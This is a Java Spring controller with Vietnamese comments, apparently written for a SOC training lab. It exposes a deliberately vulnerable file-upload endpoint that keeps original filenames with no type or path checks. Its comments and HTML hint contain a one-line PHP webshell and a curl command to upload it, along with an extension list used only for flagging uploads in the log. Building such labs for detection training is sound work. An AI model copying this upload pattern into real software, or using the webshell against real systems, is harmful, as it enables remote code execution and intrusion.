package com.proj.webprojrct.vuln;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Locale;
import java.util.Map;

/**
 * ============================================================================
 * ⚠️  KỊCH BẢN LAB SOC #4 - FILE UPLOAD VULNERABILITY (KHÔNG KIỂM TRA)  ⚠️
 * ----------------------------------------------------------------------------
 * Ghi file lên đĩa bằng ĐÚNG tên gốc, KHÔNG kiểm tra phần mở rộng / MIME /
 * nội dung -> có thể upload webshell (test.php, shell.jsp...) hoặc path traversal.
 * Ánh xạ MITRE ATT&CK T1505.003 (Web Shell).
 *
 * Log sinh ra (logs/security.log):
 *   event=FILE_UPLOAD  filename="shell.php" ext=php size=1234 saved="uploads/shell.php"
 *   event=FILE_UPLOAD_SUSPICIOUS filename="shell.php" ext=php   (khi ext nguy hiểm)
 *
 * Cách khai thác thử (Kali):
 *   echo '<?php system($_GET["c"]); ?>' > shell.php
 *   curl -F "file=@shell.php" http://<host>:8080/api/v1/vuln/upload
 * ============================================================================
 */
@RestController
@RequestMapping("/api/v1/vuln")
public class VulnUploadController {

    private static final String UPLOAD_DIR = "uploads";

    // Danh sách đuôi "nguy hiểm" chỉ để ĐÁNH DẤU trong log (vẫn cho lưu -> đúng bản chất lỗ hổng)
    private static final String[] DANGEROUS = {"php", "jsp", "jspx", "asp", "aspx", "sh", "exe", "jar", "war"};

    private final SecurityAudit audit;

    public VulnUploadController(SecurityAudit audit) {
        this.audit = audit;
    }

    /** Trang upload lab (HTML) — chọn file bất kỳ (kể cả .php) và gửi lên. */
    @GetMapping(value = "/upload-page", produces = MediaType.TEXT_HTML_VALUE)
    public String uploadPage() {
        return """
            <!doctype html><html lang='vi'><head><meta charset='utf-8'>
            <title>Vuln Upload - LAB SOC</title>
            <style>
              body{font-family:system-ui,Arial;background:#0f172a;color:#e2e8f0;display:flex;
                   min-height:100vh;align-items:center;justify-content:center;margin:0}
              .card{background:#1e293b;padding:28px 32px;border-radius:12px;width:420px;
                    box-shadow:0 10px 30px rgba(0,0,0,.4)}
              h2{margin:0 0 4px}.sub{color:#94a3b8;font-size:13px;margin-bottom:18px}
              input[type=file]{width:100%;padding:12px;border:1px dashed #475569;border-radius:8px;
                    background:#0f172a;color:#e2e8f0;box-sizing:border-box}
              button{margin-top:18px;width:100%;padding:11px;border:0;border-radius:8px;
                     background:#ef4444;color:#fff;font-weight:700;cursor:pointer}
              .hint{margin-top:16px;font-size:12px;color:#64748b;line-height:1.6}
              code{background:#0f172a;padding:2px 5px;border-radius:4px;color:#fbbf24}
            </style></head><body>
            <form class='card' method='post' action='/api/v1/vuln/upload'
                  enctype='multipart/form-data'>
              <h2>⚠️ Vuln Upload</h2>
              <div class='sub'>Upload KHÔNG kiểm tra định dạng (LAB SOC) — thử tải webshell</div>
              <input type='file' name='file'>
              <button type='submit'>TẢI LÊN</button>
              <div class='hint'>Thử: tạo <code>shell.php</code> chứa
                <code>&lt;?php system($_GET["c"]); ?&gt;</code> rồi tải lên.<br>
                File lưu vào <code>uploads/</code> bằng đúng tên gốc.</div>
            </form></body></html>
            """;
    }

    @PostMapping("/upload")
    public Object upload(@RequestParam("file") MultipartFile file, HttpServletRequest req) {
        if (file == null || file.isEmpty()) {
            return Map.of("success", false, "message", "No file");
        }

        // ❌ LỖ HỔNG: dùng thẳng tên file người dùng gửi, không làm sạch
        String original = file.getOriginalFilename();
        String ext = extensionOf(original);

        try {
            File dir = new File(UPLOAD_DIR);
            if (!dir.exists()) dir.mkdirs();

            // ❌ Không chống path traversal, không đổi tên -> ../../ hoạt động
            Path target = Paths.get(UPLOAD_DIR, original);
            file.transferTo(target.toAbsolutePath());

            if (isDangerous(ext)) {
                audit.log("FILE_UPLOAD_SUSPICIOUS", req,
                        "filename=\"" + original + "\" ext=" + ext + " size=" + file.getSize()
                        + " saved=\"" + target + "\"");
            } else {
                audit.log("FILE_UPLOAD", req,
                        "filename=\"" + original + "\" ext=" + ext + " size=" + file.getSize()
                        + " saved=\"" + target + "\"");
            }

            return Map.of("success", true, "saved", target.toString(), "size", file.getSize());
        } catch (Exception ex) {
            audit.logError("FILE_UPLOAD_ERROR", req, "filename=\"" + original + "\"", ex);
            return Map.of("success", false, "error", ex.getMessage());
        }
    }

    private String extensionOf(String name) {
        if (name == null) return "";
        int i = name.lastIndexOf('.');
        return i >= 0 ? name.substring(i + 1).toLowerCase(Locale.ROOT) : "";
    }

    private boolean isDangerous(String ext) {
        for (String d : DANGEROUS) if (d.equals(ext)) return true;
        return false;
    }
}
